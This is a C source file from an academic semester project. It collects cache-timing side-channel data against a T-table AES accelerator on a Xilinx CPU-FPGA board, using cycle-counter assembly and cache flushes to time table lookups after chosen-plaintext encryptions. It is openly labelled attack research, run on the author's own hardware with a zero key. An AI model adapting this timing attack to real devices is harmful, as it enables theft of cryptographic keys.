/**
 * Semester project Fall 2022
 * @file fpga_aes.c
 * @author Matteo Oldani
 * @version 0.1
 * @date 2023-01-18
 * 
 * This code implements the attack and data collection for the 
 * CPU to FPGA threat model 
 * 
 */

#include <stdio.h>
#include "platform.h"
#include "xil_printf.h"
#include "aes.h"
#include <xencrypt.h>
#include <xil_cache.h>

static __inline__ unsigned time_read_mem(unsigned char * addr){

	unsigned cc;

	// Resetting the timer
	__asm__ __volatile__ ("mcr p15, 0, %0, c9, c12, 2" :: "r"(1<<31)); /* stop the cc */
	__asm__ __volatile__ ("mcr p15, 0, %0, c9, c12, 0" :: "r"(5));     /* initialize */
	__asm__ __volatile__ ("mcr p15, 0, %0, c9, c12, 1" :: "r"(1<<31)); /* start the cc */

	// reading the value inside a register
	__asm__ __volatile__ ("ldr r9, [%0]" :: "r"(addr) : "r9");
	// store the value inside another register otherwise the read is not issues and the time is fized at 9
	__asm__ __volatile__ ("mov r8, r9" : : : "r9");

	// time the access
	__asm__ __volatile__ ("mrc p15, 0, r10, c9, c13, 0");
	__asm__ __volatile__ ("mov %0, r10" : "=r"(cc) : : "r9");


	return cc;

}

void rand_ptxt(unsigned char *ptxt, int exclude){
	// i should not be made random
	for(int i=0; i<16; i++){
		if(i==exclude){continue;}
		ptxt[i] = (unsigned char)(rand()%256);
	}
}


int main()
{
    init_platform();

    XEncrypt encrypt;


    unsigned char ptxt[16] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
    unsigned char ctxt[16];
    unsigned char key[16]  = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};

    unsigned attack_results[256][256];

    for(int i=0; i<256; i++){
    	for(int j=0; j<256; j++){
    		attack_results[i][j] = 0;
    	}
    }

    xil_printf("\e[1;1H\e[2J");
	xil_printf("################ STARTING THE ATTACK ################\n\n\r");

	xil_printf("The address of te0 is: 0x%p\n\r", te0);
	xil_printf("The address of te1 is: 0x%p\n\r", te1);
	xil_printf("The address of te2 is: 0x%p\n\r", te2);
	xil_printf("The address of te3 is: 0x%p\n\r", te3);

    XEncrypt_Initialize(&encrypt, 0);

    // setting the parameters needed
    XEncrypt_Set_key(   &encrypt, (UINTPTR) key);
    XEncrypt_Set_ptxt(  &encrypt, (UINTPTR) ptxt);
    XEncrypt_Set_ctxt(  &encrypt, (UINTPTR) ctxt);
    XEncrypt_Set_te0(   &encrypt, (UINTPTR) te0);
    XEncrypt_Set_te1(   &encrypt, (UINTPTR) te1);
    XEncrypt_Set_te2(   &encrypt, (UINTPTR) te2);
    XEncrypt_Set_te3(   &encrypt, (UINTPTR) te3);
    XEncrypt_Set_rcon(  &encrypt, (UINTPTR) rcon);
    XEncrypt_Set_Te4_0( &encrypt, (UINTPTR) Te4_0);
    XEncrypt_Set_Te4_1( &encrypt, (UINTPTR) Te4_1);
    XEncrypt_Set_Te4_2( &encrypt, (UINTPTR) Te4_2);
    XEncrypt_Set_Te4_3( &encrypt, (UINTPTR) Te4_3);


    for(int times=0; times<10; times++){
    	// Loop over all the addresses
    	for(int a=0; a<256; a++){
    		// Loop over all the possible plain texts
    		for(int b=0; b<256; b++){
    			xil_printf("%d %d %d\r", times, a, b);
				
				ptxt[0] = b;
				rand_ptxt(ptxt, 0);

				Xil_DCacheFlush();
				XEncrypt_Start(&encrypt);
				while(!XEncrypt_IsDone(&encrypt));


				unsigned time = time_read_mem(&te0[a]);
				if(time < 40){
					attack_results[a][b] += 1;
				}

    		}
    	}
    }

    xil_printf("\n\r");

    for(int i=0; i<256; i++){
		for(int j=0; j<256; j++){
			xil_printf("%u ", attack_results[i][j]);
		}
		xil_printf("\n\r");
	}
    cleanup_platform();
    return 0;
}
